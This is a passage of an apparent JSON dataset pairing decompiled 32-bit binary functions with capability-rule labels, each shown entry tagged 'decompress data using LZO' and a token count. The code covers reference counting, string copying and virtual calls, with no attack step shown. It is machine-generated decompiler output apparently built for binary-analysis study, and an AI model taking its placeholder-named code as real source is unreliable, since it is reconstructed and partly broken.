}\n    if (piStack52[6] == 0) {\n        puStack100 = &stack0xfffffffc;\n        uVar3 = fcn.004be210(\"uninitialized __any_string\");\n        if (var_30h_5 != &stack0xffffff74) {\n            fcn.004c2c30(var_30h_5);\n        }\n        fcn.0043a8e0(uVar3);\n        iVar4 = *0x515a34;\n        *extraout_ECX = 0x52b530;\n        piVar1 = extraout_ECX[3];\n        if (iVar4 == 0) {\n            iVar4 = piVar1[1];\n            piVar1[1] = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = piVar1 + 1;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 == 1) {\n            (**(*piVar1 + 4))();\n        }\n        *extraout_ECX = 0x52cab0;\n        fcn.004aea30(extraout_ECX + 2);\n        fcn.004aea60();\n        uVar3 = fcn.004c2c30(extraout_ECX);\n        return uVar3;\n    }\n    var_30h_5 = &stack0xffffff74;\n    puStack100 = &stack0xfffffffc;\n    fcn.004b3070(*piStack52, *piStack52 + piStack52[1] * 2, in_stack_ffffff3c & 0xffffff00);\n    uVar3 = (**(*piStack88 + 0xc))(uStack84, uStack80, uStack76, var_1ch_5, uStack68, &fcn.00491c50::var_30h_5);\n    if (var_30h_5 != &stack0xffffff74) {\n        fcn.004c2c30(var_30h_5);\n    }\n    return uVar3;\n}\n",
        "token_count": 1243
    },
    "004937b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.004937b0(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_22h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    fcn.0048cd00(arg_20h, arg_24h, &var_22h);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_22h + 2);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.0048cd70(&var_1ch);\n    iVar3 = *0x515a34;\n    uVar2 = *(var_1ch + -0xc);\n    *(arg_10h + 0x18) = 0x4936b0;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.0048b610(&var_22h + 1);\n    }\n    if (*0x515a34 == 0) {\n        iVar3 = *(unique0x10000064 + -4);\n        *(unique0x10000064 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = unique0x10000064 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.0048b610(&var_1ch);\n    return;\n}\n",
        "token_count": 543
    },
    "004939f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.004939f0(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_22h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    fcn.00484f70(arg_20h, arg_24h, &var_22h);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_22h + 2);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.00485000(&var_1ch);\n    iVar3 = *0x515a34;\n    uVar2 = *(var_1ch + -0xc);\n    *(arg_10h + 0x18) = 0x493730;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.00483750(&var_22h + 1);\n    }\n    if (*0x515a34 == 0) {\n        iVar3 = *(unique0x10000064 + -4);\n        *(unique0x10000064 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = unique0x10000064 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.00483750(&var_1ch);\n    return;\n}\n",
        "token_count": 538
    },
    "00493c30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00493c30(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.0048cd00(arg_10h, arg_14h, &var_1dh);\n    uVar3 = (**(*arg_ch + 8))(&var_1ch, arg_18h);\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.0048b610(&var_1dh);\n    return uVar3;\n}\n",
        "token_count": 283
    },
    "00493d60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00493d60(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.0048cd00(arg_10h, arg_14h, &var_1dh);\n    uVar3 = (**(*arg_ch + 8))(&var_1ch, arg_18h);\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.0048b610(&var_1dh);\n    return uVar3;\n}\n",
        "token_count": 283
    },
    "00494010": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00494010(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_bp_8h;\n    \n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.0048cd70(&var_ch);\n    iVar3 = *0x515a34;\n    uVar2 = *(var_ch + -0xc);\n    *(arg_10h + 0x18) = 0x4936b0;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_ch + -4);\n        *(var_ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.0048b610(&var_dh);\n    return;\n}\n",
        "token_count": 348
    },
    "00494170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00494170(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_bp_8h;\n    \n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.00485000(&var_ch);\n    iVar3 = *0x515a34;\n    uVar2 = *(var_ch + -0xc);\n    *(arg_10h + 0x18) = 0x493730;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_ch + -4);\n        *(var_ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.00483750(&var_dh);\n    return;\n}\n",
        "token_count": 344
    },
    "00494310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00494310(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    uVar3 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x24) = uVar3;\n    uVar3 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x25) = uVar3;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 100) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar4 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar4, iVar2, 0);\n    *(arg_10h + 0xc) = iVar2;\n    *(iVar4 + iVar2) = 0;\n    *(arg_10h + 8) = iVar4;\n    if (*0x515a34 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar4 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar4, iVar2, 0);\n    *(arg_10h + 0x18) = iVar2;\n    *(iVar4 + iVar2) = 0;\n    iVar2 = *0x515a34;\n    *(arg_10h + 0x14) = iVar4;\n    if (iVar2 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.0048b610(&var_1dh);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar2 = *(var_1ch + -0xc);\n    iVar5 = fcn.004c2c50(iVar2 + 1);\n    fcn.0044bff0(iVar5, iVar2, 0);\n    iVar4 = *0x515a34;\n    *(arg_10h + 0x1c) = iVar5;\n    *(iVar5 + iVar2) = 0;\n    *(arg_10h + 0x20) = iVar2;\n    if (iVar4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.0048b610(&var_1dh);\n    return;\n}\n",
        "token_count": 927
    },
    "00494540": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00494540(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    uVar1 = (**(*arg_ch + 8))();\n    *(arg_10h + 0x24) = uVar1;\n    uVar1 = (**(*arg_ch + 0xc))();\n    *(arg_10h + 8) = 0;\n    *(arg_10h + 0x25) = uVar1;\n    *(arg_10h + 0x14) = 0;\n    *(arg_10h + 0x1c) = 0;\n    *(arg_10h + 100) = 1;\n    (**(*arg_ch + 0x10))(arg_ch);\n    iVar2 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar2, var_2ch, 0);\n    *(arg_10h + 0xc) = var_2ch;\n    *(iVar2 + var_2ch) = 0;\n    *(arg_10h + 8) = iVar2;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x14))(arg_ch);\n    iVar2 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar2, var_2ch, 0);\n    *(arg_10h + 0x18) = var_2ch;\n    *(iVar2 + var_2ch) = 0;\n    *(arg_10h + 0x14) = iVar2;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    (**(*arg_ch + 0x18))(arg_ch);\n    iVar2 = fcn.004c2c50(var_2ch + 1);\n    fcn.00454b80(iVar2, var_2ch, 0);\n    *(iVar2 + var_2ch) = 0;\n    *(arg_10h + 0x1c) = iVar2;\n    *(arg_10h + 0x20) = var_2ch;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return;\n}\n",
        "token_count": 621
    },
    "004946b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n\nvoid __cdecl\nfcn.004946b0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar uVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t *var_ch_2;\n    int32_t var_10h_2;\n    uint var_ch;\n    uint var_10h;\n    uint var_2ch;\n    uint var_1ch;\n    uchar uStack249;\n    int32_t iStack248;\n    uchar *puStack232;\n    int32_t *piStack228;\n    int32_t *piStack224;\n    uchar *puStack220;\n    uchar *puStack216;\n    int32_t *piStack212;\n    int32_t *piStack208;\n    int32_t iStack204;\n    int32_t iStack200;\n    int32_t *piStack196;\n    uint uStack192;\n    int32_t iStack172;\n    int32_t *piStack168;\n    uchar *puStack156;\n    int32_t *piStack152;\n    uchar auStack148 [28];\n    int32_t iStack120;\n    int32_t *piStack116;\n    uchar *puStack112;\n    uchar *puStack108;\n    int32_t iStack104;\n    uchar *puStack100;\n    int32_t *piStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    uint var_3ch_2;\n    int32_t var_30h_2;\n    int32_t var_2ch_3;\n    uint var_3ch;\n    uchar var_1dh_3;\n    int32_t var_30h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_1ch_2;\n    \n    iStack80 = 0x4946c6;\n    uVar5 = (**(*var_ch_2 + 8))();\n    *(var_10h_2 + 0x24) = uVar5;\n    iStack80 = 0x4946d1;\n    uVar5 = (**(*var_ch_2 + 0xc))();\n    *(var_10h_2 + 8) = 0;\n    *(var_10h_2 + 0x26) = uVar5;\n    iVar6 = *var_ch_2;\n    *(var_10h_2 + 0x14) = 0;\n    *(var_10h_2 + 0x1c) = 0;\n    *(var_10h_2 + 0xa4) = 1;\n    piStack76 = var_ch_2;\n    iStack80 = 0x4946fc;\n    (**(iVar6 + 0x10))();\n    iVar6 = *(var_30h + -0xc);\n    iStack80 = iVar6 + 1;\n    uStack84 = 0x494710;\n    iStack80 = fcn.004c2c50();\n    uStack72 = 0;\n    uStack84 = 0x49472a;\n    piStack76 = iVar6;\n    var_2ch_3 = iStack80;\n    fcn.0044bff0();\n    *(var_10h_2 + 0xc) = iVar6;\n    *(var_2ch_3 + iVar6) = 0;\n    *(var_10h_2 + 8) = var_2ch_3;\n    if (*0x515a34 == 0) {\n        iVar6 = *(var_30h + -4);\n        *(var_30h + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = var_30h + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        puStack92 = &stack0xffffffdf;\n        piStack96 = 0x494880;\n        fcn.0048b610();\n    }\n    piStack96 = var_ch_2;\n    puStack100 = 0x494766;\n    (**(*var_ch_2 + 0x14))();\n    var_2ch_3 = *(var_30h + -0xc);\n    uVar11 = var_2ch_3 + 1;\n    if (uVar11 < 0x3fffffff) {\n        puStack100 = uVar11 * 2;\n        iStack104 = 0x49478f;\n        var_30h_2 = puStack100;\n        iVar6 = fcn.004c2c50();\n        puStack92 = NULL;\n        piStack96 = var_2ch_3;\n        iStack104 = 0x4947ab;\n        puStack100 = iVar6;\n        fcn.0044b110();\n        *(var_10h_2 + 0x14) = iVar6;\n        *(iVar6 + -2 + var_30h_2) = 0;\n        *(var_10h_2 + 0x18) = var_2ch_3;\n        if (*0x515a34 == 0) {\n            iVar6 = *(var_30h + -4);\n            *(var_30h + -4) = iVar6 + -1;\n        }\n        else {\n            LOCK();\n            piVar10 = var_30h + -4;\n            iVar6 = *piVar10;\n            *piVar10 = *piVar10 + -1;\n        }\n        if (iVar6 < 1) {\n            puStack112 = &stack0xffffffdf;\n            piStack116 = 0x4948b0;\n            fcn.00483750();\n        }\n        piStack116 = var_ch_2;\n        iStack120 = 0x4947ed;\n        (**(*var_ch_2 + 0x18))();\n        uVar11 = *(var_30h + -0xc);\n        var_ch_2 = uVar11 + 1;\n        if (var_ch_2 < 0x3fffffff) {\n            puStack100 = 0x49480f;\n            piStack96 = var_ch_2 * 2;\n            piStack96 = fcn.004c2c50();\n            uStack88 = 0;\n            puStack100 = 0x494829;\n            puStack92 = uVar11;\n            var_2ch_3 = piStack96;\n            fcn.0044b110();\n            *(var_10h_2 + 0x20) = uVar11;\n            *(var_10h_2 + 0x1c) = var_2ch_3;\n            iVar6 = *0x515a34;\n            *(var_2ch_3 + -2 + var_ch_2 * 2) = 0;\n            if (iVar6 == 0) {\n                iVar6 = *(var_30h + -4);\n                *(var_30h + -4) = iVar6 + -1;\n            }\n            else {\n                LOCK();\n                piVar10 = var_30h + -4;\n                iVar6 = *piVar10;\n                *piVar10 = *piVar10 + -1;\n            }\n            if (0 < iVar6) {\n                return;\n            }\n            puStack108 = &stack0xffffffdf;\n            puStack112 = 0x4948dc;\n            fcn.00483750();\n            return;\n        }\n        puStack100 = 0x4948fd;\n        fcn.004c33a0();\n        piStack96 = &stack0xffffffdf;\n        puStack100 = 0x49490e;\n        fcn.0048b630();\n        puStack100 = var_10h_2;\n        iStack104 = 0x494917;\n        fcn.0043a8e0();\n    }\n    else {\n        iStack104 = 0x4948f0;\n        var_10h_2 = fcn.004c33a0();\n    }\n    puStack100 = &stack0xffffffdf;\n    iStack104 = 0x494928;\n    fcn.00483770();\n    puStack108 = 0x494931;\n    iStack104 = var_10h_2;\n    fcn.0043a8e0();\n    puVar3 = puStack92;\n    piVar10 = piStack96;\n    iStack200 = 0x494956;\n    iStack120 = var_10h_2;\n    piStack116 = var_ch_2;\n    puStack112 = uVar11;\n    puStack108 = &stack0xfffffffc;\n    uVar5 = (**(*piStack96 + 8))();\n    *(puVar3 + 0x24) = uVar5;\n    iStack200 = 0x494961;\n    uVar5 = (**(*piVar10 + 0xc))();\n    *(puVar3 + 8) = 0;\n    *(puVar3 + 0x26) = uVar5;\n    iVar6 = *piVar10;\n    *(puVar3 + 0x14) = 0;\n    *(puVar3 + 0x1c) = 0;\n    puVar3[0xa4] = 1;\n    piStack196 = piVar10;\n    iStack200 = 0x49498c;\n    (**(iVar6 + 0x10))();\n    piVar1 = piStack152;\n    iStack200 = piStack152 + 1;\n    iStack204 = 0x49499d;\n    iStack200 = fcn.004c2c50();\n    uStack192 = 0;\n    piStack196 = piVar1;\n    iStack204 = 0x4949b7;\n    piStack168 = iStack200;\n    fcn.00454b80();\n    *(puVar3 + 0xc) = piVar1;\n    *(piStack168 + piVar1) = 0;\n    *(puVar3 + 8) = piStack168;\n    if (puStack156 != &stack0xffffff6c) {\n        piStack212 = puStack156;\n        puStack216 = 0x4949d9;\n        fcn.004c2c30();\n    }\n    piStack212 = piVar10;\n    puStack216 = 0x4949e4;\n    (**(*piVar10 + 0x14))();\n    piStack224 = piStack152 + 1;\n    piStack168 = piStack152;\n    if (piStack224 < 0x3fffffff) {\n        puStack216 = piStack224 * 2;\n        puStack220 = 0x494a0a;\n        iStack172 = puStack216;\n        iVar6 = fcn.004c2c50();\n        piStack208 = NULL;\n        piStack212 = piStack168;\n        puStack220 = 0x494a26;\n        puStack216 = iVar6;\n        fcn.00455930();\n        *(puVar3 + 0x14) = iVar6;\n        *(puVar3 + 0x18) = piStack168;\n        *(iVar6 + -2 + iStack172) = 0;\n        if (puStack156 != &stack0xffffff6c) {\n            piStack228 = puStack156;\n            puStack232 = 0x494a4e;\n            fcn.004c2c30();\n        }\n        piStack228 = piVar10;\n        puStack232 = 0x494a59;\n        (**(*piVar10 + 0x18))();\n        piVar10 = piStack152 + 1;\n        piStack224 = piStack152;\n        if (piVar10 < 0x3fffffff) {\n            puStack220 = 0x494a74;\n            puStack216 = piVar10 * 2;\n            puStack216 = fcn.004c2c50();\n            piStack208 = NULL;\n            piStack212 = piStack152;\n            puStack220 = 0x494a8e;\n            piStack168 = puStack216;\n            fcn.00455930();\n            *(puVar3 + 0x20) = piStack152;\n            *(piStack168 + -2 + piVar10 * 2) = 0;\n            *(puVar3 + 0x1c) = piStack168;\n            if (puStack156 != &stack0xffffff6c) {\n                piStack228 = puStack156;\n                puStack232 = 0x494ab3;\n                fcn.004c2c30();\n            }\n            return;\n        }\n    }\n    else {\n        puStack220 = 0x494acc;\n        fcn.004c33a0();\n    }\n    puStack220 = 0x494ad1;\n    fcn.004c33a0();\n    if (puStack156 != &stack0xffffff6c) {\n        puStack216 = puStack156;\n        puStack220 = 0x494ae3;\n        fcn.004c2c30();\n    }\n    puStack216 = puVar3;\n    puStack220 = 0x494aeb;\n    fcn.0043a8e0();\n    iVar2 = iStack204;\n    piVar1 = piStack208;\n    puStack232 = puVar3;\n    piStack228 = piVar10;\n    puStack220 = &stack0xffffff94;\n    uVar4 = (**(*piStack208 + 8))();\n    *(iVar2 + 0x11) = uVar4;\n    uVar4 = (**(*piVar1 + 0xc))();\n    *(iVar2 + 0x12) = uVar4;\n    uVar7 = (**(*piVar1 + 0x20))();\n    *(iVar2 + 8) = 0;\n    *(iVar2 + 0x2c) = uVar7;\n    *(iVar2 + 0x14) = 0;\n    *(iVar2 + 0x1c) = 0;\n    *(iVar2 + 0x24) = 0;\n    *(iVar2 + 0x43) = 1;\n    (**(*piVar1 + 0x10))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar8 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar8, iVar6, 0);\n    *(iVar2 + 0xc) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar2 + 8) = iVar8;\n    if (*0x515a34 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff07);\n    }\n    (**(*piVar1 + 0x14))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar8 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar8, iVar6, 0);\n    *(iVar2 + 0x18) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    *(iVar2 + 0x14) = iVar8;\n    if (*0x515a34 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff07);\n    }\n    (**(*piVar1 + 0x18))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar8 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar8, iVar6, 0);\n    *(iVar2 + 0x20) = iVar6;\n    *(iVar8 + iVar6) = 0;\n    iVar6 = *0x515a34;\n    *(iVar2 + 0x1c) = iVar8;\n    if (iVar6 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff07);\n    }\n    (**(*piVar1 + 0x1c))(piVar1);\n    iVar6 = *(iStack248 + -0xc);\n    iVar9 = fcn.004c2c50(iVar6 + 1);\n    fcn.0044bff0(iVar9, iVar6, 0);\n    iVar8 = *0x515a34;\n    *(iVar2 + 0x28) = iVar6;\n    *(iVar9 + iVar6) = 0;\n    *(iVar2 + 0x24) = iVar9;\n    if (iVar8 == 0) {\n        iVar6 = *(iStack248 + -4);\n        *(iStack248 + -4) = iVar6 + -1;\n    }\n    else {\n        LOCK();\n        piVar10 = iStack248 + -4;\n        iVar6 = *piVar10;\n        *piVar10 = *piVar10 + -1;\n    }\n    if (iVar6 < 1) {\n        fcn.0048b610(&stack0xffffff07);\n    }\n    uVar7 = (**(*piVar1 + 0x24))();\n    *(iVar2 + 0x30) = uVar7;\n    uVar7 = (**(*piVar1 + 0x28))();\n    *(iVar2 + 0x34) = uVar7;\n    return;\n}\n",
        "token_count": 4359
    },
    "00494940": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nvoid __cdecl\nfcn.00494940(uint noname_0, uint noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, \n            uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uchar uVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t *var_ch;\n    uint var_3ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar uStack145;\n    int32_t iStack144;\n    int32_t iStack128;\n    int32_t *piStack124;\n    int32_t *piStack120;\n    uchar *puStack116;\n    uint *puStack112;\n    int32_t *piStack108;\n    int32_t *piStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t *piStack92;\n    uint uStack88;\n    int32_t var_40h;\n    int32_t *var_3ch_2;\n    uint *var_30h_2;\n    int32_t *var_2ch_2;\n    uint var_28h_2;\n    uint var_ch_2;\n    \n    iStack96 = 0x494956;\n    uVar5 = (**(*var_ch + 8))();\n    *(noname_2 + 0x24) = uVar5;\n    iStack96 = 0x494961;\n    uVar5 = (**(*var_ch + 0xc))();\n    *(noname_2 + 8) = 0;\n    *(noname_2 + 0x26) = uVar5;\n    iVar6 = *var_ch;\n    *(noname_2 + 0x14) = 0;\n    *(noname_2 + 0x1c) = 0;\n    *(noname_2 + 0xa4) = 1;\n    piStack92 = var_ch;\n    iStack96 = 0x49498c;\n    (**(iVar6 + 0x10))();\n    piVar2 = var_2ch_2;\n    iStack96 = var_2ch_2 + 1;\n    iStack100 = 0x49499d;\n    iStack96 = fcn.004c2c50();\n    uStack88 = 0;\n    piStack92 = piVar2;\n    iStack100 = 0x4949b7;\n    var_3ch_2 = iStack96;\n    fcn.00454b80();\n    *(noname_2 + 0xc) = piVar2;\n    *(var_3ch_2 + piVar2) = 0;\n    *(noname_2 + 8) = var_3ch_2;\n    if (var_30h_2 != &fcn.00494940::var_28h_2) {\n        piStack108 = var_30h_2;\n        puStack112 = 0x4949d9;\n        fcn.004c2c30();\n    }\n    piStack108 = var_ch;\n    